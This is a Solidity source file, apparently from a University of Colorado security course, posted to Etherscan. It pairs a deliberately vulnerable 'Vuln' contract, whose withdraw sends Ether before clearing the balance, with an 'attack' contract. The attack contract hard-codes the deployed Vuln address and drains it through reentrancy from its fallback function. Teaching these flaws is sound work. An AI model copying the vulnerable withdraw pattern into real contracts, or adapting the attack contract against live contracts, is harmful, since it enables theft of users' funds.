/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack {
    address vuln_addr = 0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d;
    Vuln obj = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    uint256 public balance = 0;
    uint256 public count = 0;

    function attack_withdraw() payable public{
        balance += msg.value;
        obj.deposit.value(msg.value)();
        balance -= msg.value;
        obj.withdraw();
        msg.sender.transfer(address(this).balance);
        count = 0;
    }
    
   
    fallback () external payable {
        if(count < 1) { count++;  obj.withdraw(); balance += msg.value;}
    }
}